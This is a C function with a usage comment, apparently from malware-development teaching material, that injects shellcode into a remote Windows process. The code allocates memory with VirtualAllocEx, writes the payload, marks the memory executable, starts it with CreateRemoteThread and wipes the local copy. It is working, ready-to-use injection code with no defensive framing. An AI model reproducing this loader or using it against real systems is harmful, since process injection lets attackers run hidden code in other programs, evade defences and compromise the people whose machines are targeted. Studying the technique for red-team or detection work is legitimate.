/*
 * Usage Example:
 *
 * HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTargetPid);
 * InjectShellcodeToRemoteProcess(hProcess, pShellcode, sSizeOfShellcode);
 * CloseHandle(hProcess);

Shellcode Injection
To perform shellcode injection the InjectShellcodeToRemoteProcess function will be used. The function takes 3 parameters:

    hProcess - A handle to the opened remote process.

    pShellcode - The deobfuscated shellcode's base address and size. The shellcode must be in plaintext before being injected because it cannot be edited once it's in the remote process.

    sSizeOfShellcode - The size of the shellcode.

 */

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

	PVOID	pShellcodeAddress              = NULL;

	SIZE_T	sNumberOfBytesWritten          = NULL;
	DWORD	dwOldProtection                = NULL;


	// Allocate memory in the remote process of size sSizeOfShellcode 
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);


	printf("[#] Press <Enter> To Write Payload ... ");
	getchar();
	// Write the shellcode in the allocated memory
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

	memset(pShellcode, '\0', sSizeOfShellcode);

	// Make the memory region executable
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	
	printf("[#] Press <Enter> To Run ... ");
	getchar();
	printf("[i] Executing Payload ... ");
	// Launch the shellcode in a new thread
	if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[+] DONE !\n");

	return TRUE;
}
